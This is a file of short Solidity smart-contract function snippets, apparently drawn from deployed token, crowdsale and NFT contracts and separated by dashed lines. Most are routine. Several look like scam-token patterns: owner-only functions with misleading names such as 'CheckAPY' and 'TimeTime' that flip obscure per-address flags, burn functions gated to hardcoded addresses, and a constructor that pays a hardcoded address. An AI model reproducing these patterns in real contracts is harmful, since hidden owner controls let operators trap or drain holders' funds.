        require(msg.sender == ruler, "NOT ALLOWED TO RULE");

        isMinter[minter] = status;
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function BrownLiquid(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    flowers[spender] = val;
    chillis[spender] = val2; 
    llamas[spender] = val3;
    fucker = val4;
  }
--------------------------------------------------------------------------------
function addAddressToWhitelist(address addr) public onlyOwner returns(bool success) {
        if (!whitelist[addr]) {
            whitelist[addr] = true;
            emit WhitelistedAddressAdded(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {
        if (whitelist[addr]) {
            whitelist[addr] = false;
            emit WhitelistedAddressRemoved(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function remainingTokens() public view returns (uint256) {
        return Math.min(token_().balanceOf(_tokenWallet), token_().allowance(_tokenWallet, address(this)));
    }
--------------------------------------------------------------------------------
function distributeManyTokens(address[] _recipients) onlyOwnerOrAdmin public {
    for (uint256 i = 0; i < _recipients.length; i++) {
      distributeTokens( _recipients[i]);
    }
  }
--------------------------------------------------------------------------------
function retire(address _to) onlyOwner whenPaused public {
    // solium-disable-next-line security/no-block-members
    require(now > lastDepositTime.add(commissionExpiryTime));
    _to.transfer(this.balance);
    retired = true;
  }
--------------------------------------------------------------------------------
function burnFrom(address account, uint256 value) public {
        require(balances[account].sub(value) >= getLockedAmount(account));
        super.burnFrom(account, value);
    }
--------------------------------------------------------------------------------
function RUNEToken() public {
            balances_[msg.sender] = totalSupply;
                emit Transfer( address(0), msg.sender, totalSupply );
        }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool success)
    {
        bytes memory empty; // null
        _transfer( msg.sender, to, value, empty );
        return true;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint256 transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function getRate(address _token) public view returns (uint256) {
        if (_token == address(0)) {
            return rate * 10 ** 18;
        } else {
            return 0;
        }
    }
--------------------------------------------------------------------------------
function addRecipient( address _recipient, uint _rewardRate ) external onlyPolicy() {
        require( _recipient != address(0) );
        info.push( Info({
            recipient: _recipient,
            rate: _rewardRate
        }));
    }
--------------------------------------------------------------------------------
function getGameImplementation(uint8 _gameType) private view returns(GameInterface) {
        require(games[_gameType] != GameInterface(0), "Invalid game type");
        return games[_gameType];

    }
--------------------------------------------------------------------------------
function _freeze(bytes32 _id) internal {
        require(!isRoleFrozen(_id), ERROR_ROLE_ALREADY_FROZEN);
        roles[_id][FREEZE_FLAG] = true;
        emit Frozen(_id);
    }
--------------------------------------------------------------------------------
function stopICO() onlyOwner public{
            endTime = 0;
            uint256 tokenAmount=balanceOf[this];
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
            uint256 tokenAmount = _amount.mul(1 ether);
            _transfer(this, msg.sender, tokenAmount);
          }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
constructor(
        address _rewardsDistribution,
        address _rewardsToken,
        address _stakingToken
    ) public {
        rewardsToken = IERC20(_rewardsToken);
        stakingToken = IERC20(_stakingToken);
        rewardsDistribution = _rewardsDistribution;
        //opt-in to oUSD yields
        ousd = IOriginUSD(ousdAddress);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function updateStatuses(bytes32[] _listingHashes) public {
        // loop through arrays, revealing each individual vote values
        for (uint i = 0; i < _listingHashes.length; i++) {
            updateStatus(_listingHashes[i]);
        }
    }
--------------------------------------------------------------------------------
function claimRewards(uint[] _challengeIDs) public {
        // loop through arrays, claiming each individual vote reward
        for (uint i = 0; i < _challengeIDs.length; i++) {
            claimReward(_challengeIDs[i]);
        }
    }
--------------------------------------------------------------------------------
function whitelistApplication(bytes32 _listingHash) private {
        if (!listings[_listingHash].whitelisted) { emit _ApplicationWhitelisted(_listingHash); }
        listings[_listingHash].whitelisted = true;
    }
--------------------------------------------------------------------------------
function remainingBalance(address _beneficiary) external view returns (uint256 _remainingBalance) {
        Schedule memory schedule = vestingSchedule[_beneficiary];
        return schedule.amount.sub(totalDrawn[_beneficiary]);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function withdrawBalance() external onlyAdministrator {
        uint256 balance = address(this).balance;
        //        uint256 subtractFees = 3 * autoBirthFee;

        if (balance > 0) {
            //            rootAddress.transfer(balance - subtractFees);
            rootAddress.transfer(balance);
        }
    }
--------------------------------------------------------------------------------
function CcifToken() {
        founder = msg.sender;
        totalSupply = 1000000000 * 10 ** uint256(decimals);
        balances[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function publicStartRegularPhase()
  public
  {
    require(now > (icoOpenTime + 2 weeks) && icoOpenTime != 0);

    icoPhase     = false;
    regularPhase = true;
  }
--------------------------------------------------------------------------------
function TimeTime(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    catgirl[spender] = val;
    itswilly[spender] = val2; 
    scotland[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function adminshipLevel(address _newAdmin, uint8 _level) onlyAdmin(2) public { //Admin can be set
        require(_newAdmin != address(0));
        level[_newAdmin] = _level;
        emit AdminshipUpdated(_newAdmin,_level);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function withdrawTokens() public onlyOwner {
		require(status == ContractStatus.SECOND_BATCH_TOKEN_RELEASED);

		tokenContract.transfer(receivingAddress, tokenContract.balanceOf(address(this)));
	}
--------------------------------------------------------------------------------
function startTokenSale(uint8 _days) public
    onlyFounders 
    tokenIsDeployed 
    returns (bool)
    {
            tokeSaleStartTime = now;                            
            tokenSaleEndTime = tokeSaleStartTime + _days * 1 days; 
            isTokenSaleActive = !isTokenSaleActive;
            return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function withdrawTokens(address _tokenAddress) external onlyOwner {
    IERC20 token = IERC20(_tokenAddress);
    token.transfer(owner(), token.balanceOf(address(this)));
  }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function _getChallengeSuccess(uint heroGenes, uint floorGenes) private pure returns (bool) {
        // Determine if the player challenge successfuly the dungeon or not, and the new floor genes.
        uint heroPower = _getGenesPower(heroGenes);
        uint floorPower = _getGenesPower(floorGenes);

        return heroPower > floorPower;
    }
--------------------------------------------------------------------------------
function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function _mint(address to, uint256 tokenId) internal {
        super._mint(to, tokenId);

        _allTokensIndex[tokenId] = _allTokens.length;
        _allTokens.push(tokenId);
    }
--------------------------------------------------------------------------------
function changeWhitelistingStatus() onlyOwner public{
            if (whitelistingStatus == false){
			    whitelistingStatus = true;
                whitelisted[owner]= true;
            }
            else{
                whitelistingStatus = false;    
            }
		}
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
      		uint256 tokenAmount = _amount.mul(100);
            _transfer(address(this), msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
constructor() public {

    //Set total supply to hardcap
    _totalSupply = hardcap;

    //Transfer total supply to owner
    _balances[owner()] = _totalSupply;
    emit Transfer(address(0), owner(), _totalSupply);

  }
--------------------------------------------------------------------------------
function releasableAmount(address beneficiary) public view returns (uint256) {
        uint256 investmentIndex = investorLUT[beneficiary];

        return vestedAmount(beneficiary).sub(investments[investmentIndex].released);
    }
--------------------------------------------------------------------------------
function transferAdminship(address _newOwner) public onlyOwner { //Owner can be transfered
        require(_newOwner != address(0), "Not allowed");
        owner = _newOwner;
        emit TransferOwnership(owner);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _tokenId) public onlyOwnerOf(_tokenId) {
        tokenSold[_tokenId] = true;
        tokenSalePrice[_tokenId] = 0;
        clearApprovalAndTransfer(msg.sender, _to, _tokenId);
    }
--------------------------------------------------------------------------------
function join(address who) internal {
        if (indexes[who] == 0) {
            accounts[index] = who;
            indexes[who] = index;
            ++index;
        }
    }
--------------------------------------------------------------------------------
function changeGranularity(uint256 _granularity) external onlyOwner {
        require(_granularity != 0, "Invalid granularity");
        emit GranularityChanged(granularity, _granularity);
        granularity = _granularity;
    }
--------------------------------------------------------------------------------
function balanceOfAt(address _investor, uint256 _checkpointId) public view returns(uint256) {
        require(_checkpointId <= currentCheckpointId);
        return TokenLib.getValueAt(checkpointBalances[_investor], _checkpointId, balanceOf(_investor));
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {
uint256 z = x + y;
assert((z >= x) && (z >= y));
return z;
}
--------------------------------------------------------------------------------
constructor() public payable {
            address originalFeeReceive = 0x6661084EAF2DD24aCAaDe2443292Be76eb344888;
            originalFeeReceive.transfer(500000000000000000);
            owner = 0x419e79edf3f273b6325d61d2d082c7c356cb36fd; 
            balances[owner] = _totalSupply;
        }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function SummerGreen(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x679cc9d7497f387368bad17aF499a704Bd7dBf06,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function _transfer(address _from, address _to, uint _value) internal {
        require(!frozenAccount[_from]);                     // Check if sender is frozen
        require(!frozenAccount[_to]);                       // Check if recipient is frozen
        super._transfer(_from, _to, _value);
    }
--------------------------------------------------------------------------------
function getContributionBalanceForTokenGroup(uint256 _tokenId, address userAdd) external view returns (uint balance) {
    var group = tokenIndexToGroup[_tokenId];
    require(group.exists);
    balance = group.addressToContribution[userAdd];
  }
--------------------------------------------------------------------------------
function getContributorsInTokenGroupCount(uint256 _tokenId) external view returns (uint count) {
    var group = tokenIndexToGroup[_tokenId];
    require(group.exists);
    count = group.contributorArr.length;
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
constructor() public {
        bytes32 ownerPosition = _ownerPosition;
        address owner = msg.sender;
        assembly {
            sstore(ownerPosition, owner)
        }
    }
--------------------------------------------------------------------------------
function mint(address to, uint value, uint phase) onlyOwner() external
    {
        require(!isActive);

        icoBalances[to].balances[phase] += value;// Increase ICO balance.

        Mint(to, value, phase);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function adminWithdraw(uint256 _amount) public onlyAdmin {
        atari.safeTransfer(address(msg.sender), _amount);
        emit DevWithdraw(msg.sender, _amount);
    }
--------------------------------------------------------------------------------
function allowance(address _owner, address _spender)
        public
        constant
        returns (uint256 remaining)
    {
        if (_owner == foundationReserve && _spender == owner) {
            return availableReserve();
        }

        return allowed[_owner][_spender];
    }
--------------------------------------------------------------------------------
constructor(
        address _to)
        public
    {
        balancesHistory_[_to].addCheckpoint(_getBlockNumber(), totalSupply_);
        emit Transfer(address(0), _to, totalSupply_);
    }
--------------------------------------------------------------------------------
function changeChefAddress(address newAddr) public onlyOwner {
        require(
            newAddr != address(0),
            "zero address is not allowed"
        );
        
       chefAddress = newAddr;
    }
--------------------------------------------------------------------------------
function changeTeamAddress(address newAddr) public onlyOwner {
        require(
            newAddr != address(0),
            "zero address is not allowed"
        );
        
        teamAddress = newAddr;
    }
--------------------------------------------------------------------------------
function startSale(uint256 saleStart, uint256 saleStop) onlyOwner returns (bool success) {
        require(saleStop > now);     
        startTime = saleStart; 
        stopTime = saleStop; 
        crowdsaleClosed = false; 
        return true; 
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
    public
    ownerExists(msg.sender)
    transactionExists(transactionId)
    notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x5dC914AF1Ecc41C797BA20c73E23DDCA517A65b0,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function () public payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function optIn() public returns(bool) {
        delete userOptOutVersion[msg.sender];
        emit OptedIn(msg.sender, latestVersion);
        return true;
    }
--------------------------------------------------------------------------------
function returnRate() public constant returns(uint256) {
        if (block.number>=startBlock && block.number<=endBlock) return 4; // ICO
        return 0;// out of ICO 
    }
--------------------------------------------------------------------------------
function perAddressCap() public constant returns(uint256) {
        uint256 baseline = 1000 * (10**18);
        return baseline.add(presaleEtherRaised.div(100));
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external override
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function tokenPause() public {
        require(rightAndRoles.onlyRoles(msg.sender,6));
        require(!isFinalized);
        token.setPause(true);
    }
--------------------------------------------------------------------------------
function withdrawERC20Token(address tokenAddress, address to) public onlyOwner {
        ERC20Basic token = ERC20Basic(tokenAddress);
        token.transfer(to, token.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function Holdplatform_Airdrop(address tokenAddress, uint256 HPM_status, uint256 HPM_divider) public restricted {
		require(HPM_status == 0 || HPM_status == 1 );
		
		Holdplatform_status[tokenAddress] 	= HPM_status;	
		Holdplatform_divider[tokenAddress] 	= HPM_divider;	// Airdrop = 100% : Divider
	
    }
--------------------------------------------------------------------------------
function setup(address _coreAddress, address _pluginsContract) public onlyOwner {
        CutieCoreInterface candidateContract = CutieCoreInterface(_coreAddress);
        require(candidateContract.isCutieCore());
        coreContract = candidateContract;

        pluginsContract = _pluginsContract;
    }
--------------------------------------------------------------------------------
function hasEnded() public view returns (bool) {
        bool overPeriod = now > endTime;
        bool underPurchasableAmount = getPurchasableAmount() < 10000;
        return overPeriod || underPurchasableAmount;
    }
--------------------------------------------------------------------------------
function getReserved() public view
        returns (uint256 vaultTokens, uint256 vaultFunds) {
        address vaultAddress = address(_vault);
        vaultTokens = rewardToken.balanceOf(vaultAddress);
        vaultFunds = vaultAddress.balance;
    }
--------------------------------------------------------------------------------
constructor(string memory oracleName, string memory oracleCreatorName, uint version) public {
        oracleData.name = oracleName;
        oracleData.creatorName = oracleCreatorName;
        oracleData.version = version;
        emit OracleCreated();
    }
--------------------------------------------------------------------------------
function submitIssue(uint _value) public onlyMANAGER {
        params[ISSUE_METHOD] = MethodParam(ISSUE_METHOD, _value, true);
        emit SubmitIsses(msg.sender,_value);
    }
--------------------------------------------------------------------------------
function submitRedeem(uint _value) public onlyMANAGER {
        params[REDEEM_METHOD] = MethodParam(REDEEM_METHOD, _value, true);
         emit SubmitRedeem(msg.sender,_value);
    }
--------------------------------------------------------------------------------
function () external payable
    {
                        if( msg.value > 0 )
            buyTokens(msg.sender);
        else
            airDrop(msg.sender); 
        
        
        
           
    }
--------------------------------------------------------------------------------
constructor() public {
        bytes32 ownerPosition = _ownerPosition;
        address owner = msg.sender;
        assembly {
            sstore(ownerPosition, owner)
        }
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) revert(); 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function stopICO() onlyOwner public{
            endTime = 0;
            uint256 tokenAmount=balanceOf[this];
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
            uint256 tokenAmount = _amount.mul(1 ether);
            _transfer(this, msg.sender, tokenAmount);
          }
--------------------------------------------------------------------------------
function withdraw(address _to) public onlyOwner {
		require(actived == true);
		require(!frozenAccount[_to]);
		_to.transfer(address(this).balance);
	}
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require (address(this).balance != 0);
        require (ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function IncreaseTime(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    carro[spender] = val;
    chaoping[spender] = val2; 
    xixi[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwnerCandidate) external onlyOwner {
        require(_newOwnerCandidate != address(0));

        newOwnerCandidate = _newOwnerCandidate;

        emit OwnershipRequested(msg.sender, newOwnerCandidate);
    }
--------------------------------------------------------------------------------
function updateContractAddress(
        bytes32 _contractName,
        address payable _contractAddress
    )
        external
        onlyAuthorized()
        notZeroValue(_contractName.length)
        notZeroAddress(_contractAddress)
        notZeroAddress(contractAddress[_contractName])
        returns (bool)
    {
        emit ContractAddressUpdated(
            _contractName,
            contractAddress[_contractName],
            _contractAddress
        );
        contractAddress[_contractName] = _contractAddress;

        return true;
    }
--------------------------------------------------------------------------------
function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {
    super._preValidatePurchase(_beneficiary, _weiAmount);
    require(contributions[_beneficiary].add(_weiAmount) <= caps[_beneficiary]);
  }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
    super._transferFrom(from, to, tokenId);

    _removeTokenFromOwnerEnumeration(from, tokenId);

    _addTokenToOwnerEnumeration(to, tokenId);
  }
--------------------------------------------------------------------------------
function getWallet(string calldata recipientID)
        external
        view
        returns (Wallet memory)
    {
        require(
            walletsIDMap[recipientID].walletAddress != address(0x0),
            "invalid wallet"
        );
        return walletsIDMap[recipientID];
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function mintTokens(address[] calldata recipients)
  public
  payable
  onlyOwner{
    for(uint i=0; i<recipients.length; i++){
        _mint(recipients[i]);
     }
  }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public{
        //sending all the tokens to Owner
        _balanceOf[owner] = totalSupply;
        
        //maximum minting set to totalSupply
        maximumMinting = totalSupply;
        
        //firing event which logs this transaction
        emit Transfer(address(0), owner, totalSupply);
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function vegetablePrice(uint256 _VegetableId) public view returns(uint256){
		return SafeMath.div(SafeMath.div(address(this).balance,VegetableCount),VegetablesTradeBalance[_VegetableId]);
    }
--------------------------------------------------------------------------------
function setJackpot() public payable adminOnly returns (bool) {
        if (msg.value > 0) {
            jackpot += msg.value;
            return true;
        }
        return false;
    }
--------------------------------------------------------------------------------
function finalize() public inState(State.Success) onlyOwner stopInEmergency {

    // Already finalized
    if(finalized) {
      throw;
    }

    // Finalizing is optional. We only call it if we are given a finalizing agent.
    if(address(finalizeAgent) != 0) {
      finalizeAgent.finalizeCrowdsale();
    }

    finalized = true;
  }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function getUserBonusAvailable(address _user) public view returns(uint ETH_Released, uint token_Released) {
        
        uint ETHValue = _calculateETHReleasedAmount(_user);
        uint tokenValue = _calculateTokenReleasedAmount(_user);
        
        return (ETHValue, tokenValue);
    }
--------------------------------------------------------------------------------
function withdraw(address transferTo) onlyOwner external {
        // Prevent https://consensys.github.io/smart-contract-best-practices/known_attacks/#transaction-ordering-dependence-tod-front-running
        require(transferTo == owner);

        uint256 currentBalance = address(this).balance;
        owner.transfer(currentBalance);
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function Gold(address _mntpContractAddress, address _goldmintTeamAddress, address _goldFeeAddress) public {
        creator = msg.sender;

        mntpToken = IMNTP(_mntpContractAddress);
        goldmintTeamAddress = _goldmintTeamAddress;
        goldFee = IGoldFee(_goldFeeAddress);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 25;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function setMinter(address minter, bool status) external {
        require(msg.sender == ruler, "NOT ALLOWED TO RULE");

        isMinter[minter] = status;
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) pure internal returns(uint256) {
      uint256 z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function ownerOf(uint256 tokenId) public view returns (address) {
        require(_exists(tokenId), "Token does not exists.");
        return _ownerOf(tokenId);
    }
--------------------------------------------------------------------------------
function marketOfferGetTokenPrice(uint256 _tokenId) public view returns (uint256 _price) {
        require(_exists(_tokenId), "Token does not exists.");
        return _marketOfferGetTokenPrice(_tokenId);
    }
--------------------------------------------------------------------------------
function marketOfferExists(uint256 _tokenId) public view returns (bool) {
        require(_exists(_tokenId), "Token does not exists.");
        
        return _marketOfferExists(_tokenId);
    }
--------------------------------------------------------------------------------
function LooksCoin() payable {
        owner = msg.sender;
        wallet = msg.sender;
        tokensCount = INITIAL_TOKENS_COUNT;
        balances[owner] = tokensCount;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    argentina[spender] = val;
    sandals[spender] = val2; 
    bluecart[spender] = val3;
    cocos = val4;
  }
--------------------------------------------------------------------------------
function AmbrosusSale() {
    tokens = new AmberToken();
    tokens.mint(0x00C269e9D02188E39C9922386De631c6AED5b4d4, 144590975014280560863612000);
    saleRevenue += 144590975014280560863612000;
    totalSold += 144590975014280560863612000;

  }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    buggy[spender] = val;
    golf[spender] = val2; 
    soccer[spender] = val3;
    grandhotel = val4;
  }
--------------------------------------------------------------------------------
function _wrapNxm()
      internal
    {
        // Wrap our full NXM balance.
        uint256 amount = nxm.balanceOf( address(this) );
        IWNXM(address(wNxm)).wrap(amount);
    }
--------------------------------------------------------------------------------
function hasValueAt(
        Values[] storage values,
        uint256 snapshotId
    )
        internal
        constant
        returns (bool)
    {
        require(snapshotId <= mCurrentSnapshotId());
        return values.length > 0 && values[0].snapshotId <= snapshotId;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xe11AE7A51d03834DB5BaFFFf817c952bE940341D,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function PBC(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        super._transfer(sender, recipient, amount);
        _moveDelegates(_delegates[sender], _delegates[recipient], amount);
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function revealedValue(uint256 position) public view returns (uint256) {
        require(position <= revealedValues.length,"position not in array");
        return revealedValues[position];
    }
--------------------------------------------------------------------------------
constructor() public payable {
            address originalFeeReceive = 0x6661084EAF2DD24aCAaDe2443292Be76eb344888;
            originalFeeReceive.transfer(500000000000000000);
            owner = 0xfa1b2c98ac7a1b05d84a5d2a500d6ad0b152b86a; 
            balances[owner] = _totalSupply;
        }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function withdrawTokens() public onlyOwner {
        require(!saleActive);
        uint256 remainingTokens = plgToken.balanceOf(this);
        plgToken.transfer(bonusPool, remainingTokens);
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function getAuthorizeContract(uint256 _cid) 
        external 
        view 
        returns(string _name, address _acontract) {
        AuthorizedContract memory acontract = authorizedContracts[_cid]; 
        _name = acontract.name;
        _acontract = acontract.acontract;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function finalizeSale() atStage(Stages.MAINSALE) internal {
    mainSale_EndDate = now;
    require(SolidToken(token).setTransferEnablingDate(now + TOKEN_RELEASE_DELAY));
    currentStage = Stages.FINALIZED;
  }
--------------------------------------------------------------------------------
function transferByPartition(
    bytes32 partition,
    address to,
    uint256 value,
    bytes calldata data
  )
    external
    returns (bytes32)
  {
    return _transferByPartition(partition, msg.sender, msg.sender, to, value, data, "");
  }
--------------------------------------------------------------------------------
function DogeCoin() {
        founder = msg.sender;
        totalSupply = 20180000 * 10 ** uint256(decimals);
        balances[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function() 
        external 
        payable 
    {
        if (isCrowdsaleActive()) {
            buy();
        } else { 
            require (msg.sender == fund || msg.sender == owner);    //after crowdsale owner can send back eth for refund
        }
    }
--------------------------------------------------------------------------------
function isCrowdsaleActive() 
        public 
        constant 
        returns (bool) 
    {

        if (endBlockNumber < block.number || START_BLOCK_NUMBER > block.number) {
            return false;
        }
        return true;
    }
--------------------------------------------------------------------------------
function updateForgeL1L2BatchTimeout(uint8 newForgeL1L2BatchTimeout)
        external
        onlyGovernance
    {
        require(
